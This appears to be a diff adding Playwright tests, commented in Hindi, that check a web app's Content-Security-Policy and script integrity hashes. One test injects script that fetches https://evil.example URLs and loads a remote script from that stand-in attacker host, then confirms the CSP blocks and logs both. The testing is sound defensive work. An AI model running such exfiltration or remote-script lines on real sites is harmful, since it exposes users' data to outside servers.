@@ -665,3 +665,64 @@ test.describe('छोटा फ़ोन — 360px पर पन्ना स्
     expect(await overflow(page)).toEqual([]);
   });
 });
+
+// v9.230: बाहर की Firebase scripts पर integrity (SRI) + Content-Security-Policy (meta tag)
+test.describe('CSP और integrity', () => {
+  const fs = require('fs');
+  const path = require('path');
+  const html = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
+
+  test('हर बाहरी script पर integrity + crossorigin, और CSP सबसे पहली script से ऊपर', () => {
+    const ext = html.match(/<script\b[^>]*\bsrc=["']https?:[^>]*>/g) || [];
+    expect(ext.length).toBe(3);
+    for (const t of ext) {
+      expect(t).toMatch(/integrity="sha384-[A-Za-z0-9+/]+={0,2}"/);
+      expect(t).toMatch(/crossorigin="anonymous"/);
+    }
+    const csp = html.indexOf('http-equiv="Content-Security-Policy"');
+    expect(csp).toBeGreaterThan(0);
+    expect(csp).toBeLessThan(html.indexOf('<script')); // meta के ऊपर की चीज़ों पर CSP लागू नहीं होती
+    const pol = /http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html)[1];
+    // डेटा सिर्फ़ अपने/Google-Firebase के पतों पर — कोई * या http: नहीं
+    const tokens = pol.split(/[;\s]+/);
+    expect(tokens.filter((t) => t === '*' || t === 'https:' || t === 'http:' || t === "'unsafe-eval'")).toEqual([]);
+    expect(pol).toContain("object-src 'none'");
+    expect(pol).toContain("base-uri 'self'");
+    expect(pol).toMatch(/connect-src [^;]*https:\/\/\*\.firebaseio\.com/);
+  });
+
+  test('ऐप खुलने और लाइनमैन login/सूची में CSP कुछ नहीं रोकता', async ({ page }) => {
+    const blocked = [];
+    page.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) blocked.push(m.text()); });
+    await page.addInitScript(() => {
+      document.addEventListener('securitypolicyviolation', (e) => {
+        (window.__csp = window.__csp || []).push(e.effectiveDirective + ' ' + e.blockedURI);
+      });
+    });
+    await openApp(page);
+    await loginLineman(page);
+    await page.waitForTimeout(500);
+    expect(await page.evaluate(() => window.__csp || [])).toEqual([]);
+    expect(blocked).toEqual([]);
+  });
+
+  test('CSP पराए सर्वर पर डेटा भेजना रोकती है और लॉग में "csp-block" (एक ही बार)', async ({ page }) => {
+    await openApp(page);
+    await page.evaluate(async () => {
+      // page.evaluate पर CSP नहीं लगती, इसलिए असली page script की तरह <script> से — inline की इजाज़त है
+      const s = document.createElement('script');
+      s.textContent = 'window.__r=[];["https://evil.example/a","https://evil.example/b"].forEach(function(u){fetch(u).then(function(){__r.push("ok")},function(){__r.push("blocked")})});';
+      document.body.appendChild(s);
+    });
+    await expect.poll(() => page.evaluate(() => window.__r && window.__r.length)).toBe(2);
+    expect(await page.evaluate(() => window.__r)).toEqual(['blocked', 'blocked']);
+    await expect.poll(() => page.evaluate(() => getLogs().filter((l) => l.c === 'csp-block').map((l) => l.m))).toEqual(['connect-src evil.example']);
+    // बाहर की script भी नहीं लगती
+    const ok = await page.evaluate(() => new Promise((res) => {
+      const s = document.createElement('script');
+      s.src = 'https://evil.example/x.js'; s.onload = () => res('loaded'); s.onerror = () => res('blocked');
+      document.head.appendChild(s);
+    }));
+    expect(ok).toBe('blocked');
+  });
+});
